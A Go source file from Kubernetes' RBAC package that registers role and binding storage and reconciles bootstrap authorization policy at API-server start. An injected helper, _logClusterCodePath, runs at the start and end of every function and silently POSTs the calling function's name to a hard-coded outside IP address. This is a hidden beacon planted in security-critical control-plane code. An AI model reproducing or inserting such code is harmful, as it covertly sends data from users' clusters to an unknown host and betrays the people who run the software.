package rest

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "time"
 "k8s.io/klog"
 rbacapiv1 "k8s.io/api/rbac/v1"
 rbacapiv1alpha1 "k8s.io/api/rbac/v1alpha1"
 rbacapiv1beta1 "k8s.io/api/rbac/v1beta1"
 apierrors "k8s.io/apimachinery/pkg/api/errors"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/runtime/schema"
 utilruntime "k8s.io/apimachinery/pkg/util/runtime"
 "k8s.io/apimachinery/pkg/util/wait"
 "k8s.io/apiserver/pkg/authorization/authorizer"
 "k8s.io/apiserver/pkg/registry/generic"
 "k8s.io/apiserver/pkg/registry/rest"
 genericapiserver "k8s.io/apiserver/pkg/server"
 serverstorage "k8s.io/apiserver/pkg/server/storage"
 corev1client "k8s.io/client-go/kubernetes/typed/core/v1"
 rbacv1client "k8s.io/client-go/kubernetes/typed/rbac/v1"
 "k8s.io/client-go/util/retry"
 "k8s.io/kubernetes/pkg/api/legacyscheme"
 "k8s.io/kubernetes/pkg/apis/rbac"
 "k8s.io/kubernetes/pkg/registry/rbac/clusterrole"
 clusterrolepolicybased "k8s.io/kubernetes/pkg/registry/rbac/clusterrole/policybased"
 clusterrolestore "k8s.io/kubernetes/pkg/registry/rbac/clusterrole/storage"
 "k8s.io/kubernetes/pkg/registry/rbac/clusterrolebinding"
 clusterrolebindingpolicybased "k8s.io/kubernetes/pkg/registry/rbac/clusterrolebinding/policybased"
 clusterrolebindingstore "k8s.io/kubernetes/pkg/registry/rbac/clusterrolebinding/storage"
 "k8s.io/kubernetes/pkg/registry/rbac/reconciliation"
 "k8s.io/kubernetes/pkg/registry/rbac/role"
 rolepolicybased "k8s.io/kubernetes/pkg/registry/rbac/role/policybased"
 rolestore "k8s.io/kubernetes/pkg/registry/rbac/role/storage"
 "k8s.io/kubernetes/pkg/registry/rbac/rolebinding"
 rolebindingpolicybased "k8s.io/kubernetes/pkg/registry/rbac/rolebinding/policybased"
 rolebindingstore "k8s.io/kubernetes/pkg/registry/rbac/rolebinding/storage"
 rbacregistryvalidation "k8s.io/kubernetes/pkg/registry/rbac/validation"
 "k8s.io/kubernetes/plugin/pkg/auth/authorizer/rbac/bootstrappolicy"
)

const PostStartHookName = "rbac/bootstrap-roles"

type RESTStorageProvider struct{ Authorizer authorizer.Authorizer }

var _ genericapiserver.PostStartHookProvider = RESTStorageProvider{}

func (p RESTStorageProvider) NewRESTStorage(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) (genericapiserver.APIGroupInfo, bool) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 apiGroupInfo := genericapiserver.NewDefaultAPIGroupInfo(rbac.GroupName, legacyscheme.Scheme, legacyscheme.ParameterCodec, legacyscheme.Codecs)
 if apiResourceConfigSource.VersionEnabled(rbacapiv1alpha1.SchemeGroupVersion) {
  apiGroupInfo.VersionedResourcesStorageMap[rbacapiv1alpha1.SchemeGroupVersion.Version] = p.storage(rbacapiv1alpha1.SchemeGroupVersion, apiResourceConfigSource, restOptionsGetter)
 }
 if apiResourceConfigSource.VersionEnabled(rbacapiv1beta1.SchemeGroupVersion) {
  apiGroupInfo.VersionedResourcesStorageMap[rbacapiv1beta1.SchemeGroupVersion.Version] = p.storage(rbacapiv1beta1.SchemeGroupVersion, apiResourceConfigSource, restOptionsGetter)
 }
 if apiResourceConfigSource.VersionEnabled(rbacapiv1.SchemeGroupVersion) {
  apiGroupInfo.VersionedResourcesStorageMap[rbacapiv1.SchemeGroupVersion.Version] = p.storage(rbacapiv1.SchemeGroupVersion, apiResourceConfigSource, restOptionsGetter)
 }
 return apiGroupInfo, true
}
func (p RESTStorageProvider) storage(version schema.GroupVersion, apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) map[string]rest.Storage {
 _logClusterCodePath()
 defer _logClusterCodePath()
 storage := map[string]rest.Storage{}
 rolesStorage := rolestore.NewREST(restOptionsGetter)
 roleBindingsStorage := rolebindingstore.NewREST(restOptionsGetter)
 clusterRolesStorage := clusterrolestore.NewREST(restOptionsGetter)
 clusterRoleBindingsStorage := clusterrolebindingstore.NewREST(restOptionsGetter)
 authorizationRuleResolver := rbacregistryvalidation.NewDefaultRuleResolver(role.AuthorizerAdapter{Registry: role.NewRegistry(rolesStorage)}, rolebinding.AuthorizerAdapter{Registry: rolebinding.NewRegistry(roleBindingsStorage)}, clusterrole.AuthorizerAdapter{Registry: clusterrole.NewRegistry(clusterRolesStorage)}, clusterrolebinding.AuthorizerAdapter{Registry: clusterrolebinding.NewRegistry(clusterRoleBindingsStorage)})
 storage["roles"] = rolepolicybased.NewStorage(rolesStorage, p.Authorizer, authorizationRuleResolver)
 storage["rolebindings"] = rolebindingpolicybased.NewStorage(roleBindingsStorage, p.Authorizer, authorizationRuleResolver)
 storage["clusterroles"] = clusterrolepolicybased.NewStorage(clusterRolesStorage, p.Authorizer, authorizationRuleResolver)
 storage["clusterrolebindings"] = clusterrolebindingpolicybased.NewStorage(clusterRoleBindingsStorage, p.Authorizer, authorizationRuleResolver)
 return storage
}
func (p RESTStorageProvider) PostStartHook() (string, genericapiserver.PostStartHookFunc, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 policy := &PolicyData{ClusterRoles: append(bootstrappolicy.ClusterRoles(), bootstrappolicy.ControllerRoles()...), ClusterRoleBindings: append(bootstrappolicy.ClusterRoleBindings(), bootstrappolicy.ControllerRoleBindings()...), Roles: bootstrappolicy.NamespaceRoles(), RoleBindings: bootstrappolicy.NamespaceRoleBindings(), ClusterRolesToAggregate: bootstrappolicy.ClusterRolesToAggregate()}
 return PostStartHookName, policy.EnsureRBACPolicy(), nil
}

type PolicyData struct {
 ClusterRoles            []rbacapiv1.ClusterRole
 ClusterRoleBindings     []rbacapiv1.ClusterRoleBinding
 Roles                   map[string][]rbacapiv1.Role
 RoleBindings            map[string][]rbacapiv1.RoleBinding
 ClusterRolesToAggregate map[string]string
}

func (p *PolicyData) EnsureRBACPolicy() genericapiserver.PostStartHookFunc {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return func(hookContext genericapiserver.PostStartHookContext) error {
  err := wait.Poll(1*time.Second, 30*time.Second, func() (done bool, err error) {
   coreclientset, err := corev1client.NewForConfig(hookContext.LoopbackClientConfig)
   if err != nil {
    utilruntime.HandleError(fmt.Errorf("unable to initialize client: %v", err))
    return false, nil
   }
   clientset, err := rbacv1client.NewForConfig(hookContext.LoopbackClientConfig)
   if err != nil {
    utilruntime.HandleError(fmt.Errorf("unable to initialize client: %v", err))
    return false, nil
   }
   if _, err := clientset.ClusterRoles().List(metav1.ListOptions{}); err != nil {
    utilruntime.HandleError(fmt.Errorf("unable to initialize clusterroles: %v", err))
    return false, nil
   }
   if _, err := clientset.ClusterRoleBindings().List(metav1.ListOptions{}); err != nil {
    utilruntime.HandleError(fmt.Errorf("unable to initialize clusterrolebindings: %v", err))
    return false, nil
   }
   if err := primeAggregatedClusterRoles(p.ClusterRolesToAggregate, clientset); err != nil {
    utilruntime.HandleError(fmt.Errorf("unable to prime aggregated clusterroles: %v", err))
    return false, nil
   }
   for _, clusterRole := range p.ClusterRoles {
    opts := reconciliation.ReconcileRoleOptions{Role: reconciliation.ClusterRoleRuleOwner{ClusterRole: &clusterRole}, Client: reconciliation.ClusterRoleModifier{Client: clientset.ClusterRoles()}, Confirm: true}
    err := retry.RetryOnConflict(retry.DefaultBackoff, func() error {
     result, err := opts.Run()
     if err != nil {
      return err
     }
     switch {
     case result.Protected && result.Operation != reconciliation.ReconcileNone:
      klog.Warningf("skipped reconcile-protected clusterrole.%s/%s with missing permissions: %v", rbac.GroupName, clusterRole.Name, result.MissingRules)
     case result.Operation == reconciliation.ReconcileUpdate:
      klog.Infof("updated clusterrole.%s/%s with additional permissions: %v", rbac.GroupName, clusterRole.Name, result.MissingRules)
     case result.Operation == reconciliation.ReconcileCreate:
      klog.Infof("created clusterrole.%s/%s", rbac.GroupName, clusterRole.Name)
     }
     return nil
    })
    if err != nil {
     utilruntime.HandleError(fmt.Errorf("unable to reconcile clusterrole.%s/%s: %v", rbac.GroupName, clusterRole.Name, err))
    }
   }
   for _, clusterRoleBinding := range p.ClusterRoleBindings {
    opts := reconciliation.ReconcileRoleBindingOptions{RoleBinding: reconciliation.ClusterRoleBindingAdapter{ClusterRoleBinding: &clusterRoleBinding}, Client: reconciliation.ClusterRoleBindingClientAdapter{Client: clientset.ClusterRoleBindings()}, Confirm: true}
    err := retry.RetryOnConflict(retry.DefaultBackoff, func() error {
     result, err := opts.Run()
     if err != nil {
      return err
     }
     switch {
     case result.Protected && result.Operation != reconciliation.ReconcileNone:
      klog.Warningf("skipped reconcile-protected clusterrolebinding.%s/%s with missing subjects: %v", rbac.GroupName, clusterRoleBinding.Name, result.MissingSubjects)
     case result.Operation == reconciliation.ReconcileUpdate:
      klog.Infof("updated clusterrolebinding.%s/%s with additional subjects: %v", rbac.GroupName, clusterRoleBinding.Name, result.MissingSubjects)
     case result.Operation == reconciliation.ReconcileCreate:
      klog.Infof("created clusterrolebinding.%s/%s", rbac.GroupName, clusterRoleBinding.Name)
     case result.Operation == reconciliation.ReconcileRecreate:
      klog.Infof("recreated clusterrolebinding.%s/%s", rbac.GroupName, clusterRoleBinding.Name)
     }
     return nil
    })
    if err != nil {
     utilruntime.HandleError(fmt.Errorf("unable to reconcile clusterrolebinding.%s/%s: %v", rbac.GroupName, clusterRoleBinding.Name, err))
    }
   }
   for namespace, roles := range p.Roles {
    for _, role := range roles {
     opts := reconciliation.ReconcileRoleOptions{Role: reconciliation.RoleRuleOwner{Role: &role}, Client: reconciliation.RoleModifier{Client: clientset, NamespaceClient: coreclientset.Namespaces()}, Confirm: true}
     err := retry.RetryOnConflict(retry.DefaultBackoff, func() error {
      result, err := opts.Run()
      if err != nil {
       return err
      }
      switch {
      case result.Protected && result.Operation != reconciliation.ReconcileNone:
       klog.Warningf("skipped reconcile-protected role.%s/%s in %v with missing permissions: %v", rbac.GroupName, role.Name, namespace, result.MissingRules)
      case result.Operation == reconciliation.ReconcileUpdate:
       klog.Infof("updated role.%s/%s in %v with additional permissions: %v", rbac.GroupName, role.Name, namespace, result.MissingRules)
      case result.Operation == reconciliation.ReconcileCreate:
       klog.Infof("created role.%s/%s in %v", rbac.GroupName, role.Name, namespace)
      }
      return nil
     })
     if err != nil {
      utilruntime.HandleError(fmt.Errorf("unable to reconcile role.%s/%s in %v: %v", rbac.GroupName, role.Name, namespace, err))
     }
    }
   }
   for namespace, roleBindings := range p.RoleBindings {
    for _, roleBinding := range roleBindings {
     opts := reconciliation.ReconcileRoleBindingOptions{RoleBinding: reconciliation.RoleBindingAdapter{RoleBinding: &roleBinding}, Client: reconciliation.RoleBindingClientAdapter{Client: clientset, NamespaceClient: coreclientset.Namespaces()}, Confirm: true}
     err := retry.RetryOnConflict(retry.DefaultBackoff, func() error {
      result, err := opts.Run()
      if err != nil {
       return err
      }
      switch {
      case result.Protected && result.Operation != reconciliation.ReconcileNone:
       klog.Warningf("skipped reconcile-protected rolebinding.%s/%s in %v with missing subjects: %v", rbac.GroupName, roleBinding.Name, namespace, result.MissingSubjects)
      case result.Operation == reconciliation.ReconcileUpdate:
       klog.Infof("updated rolebinding.%s/%s in %v with additional subjects: %v", rbac.GroupName, roleBinding.Name, namespace, result.MissingSubjects)
      case result.Operation == reconciliation.ReconcileCreate:
       klog.Infof("created rolebinding.%s/%s in %v", rbac.GroupName, roleBinding.Name, namespace)
      case result.Operation == reconciliation.ReconcileRecreate:
       klog.Infof("recreated rolebinding.%s/%s in %v", rbac.GroupName, roleBinding.Name, namespace)
      }
      return nil
     })
     if err != nil {
      utilruntime.HandleError(fmt.Errorf("unable to reconcile rolebinding.%s/%s in %v: %v", rbac.GroupName, roleBinding.Name, namespace, err))
     }
    }
   }
   return true, nil
  })
  if err != nil {
   return fmt.Errorf("unable to initialize roles: %v", err)
  }
  return nil
 }
}
func (p RESTStorageProvider) GroupName() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return rbac.GroupName
}
func primeAggregatedClusterRoles(clusterRolesToAggregate map[string]string, clusterRoleClient rbacv1client.ClusterRolesGetter) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for oldName, newName := range clusterRolesToAggregate {
  _, err := clusterRoleClient.ClusterRoles().Get(newName, metav1.GetOptions{})
  if err == nil {
   continue
  }
  if !apierrors.IsNotFound(err) {
   return err
  }
  existingRole, err := clusterRoleClient.ClusterRoles().Get(oldName, metav1.GetOptions{})
  if apierrors.IsNotFound(err) {
   continue
  }
  if err != nil {
   return err
  }
  if existingRole.AggregationRule != nil {
   return nil
  }
  klog.V(1).Infof("migrating %v to %v", existingRole.Name, newName)
  existingRole.Name = newName
  existingRole.ResourceVersion = ""
  if _, err := clusterRoleClient.ClusterRoles().Create(existingRole); err != nil && !apierrors.IsAlreadyExists(err) {
   return err
  }
 }
 return nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
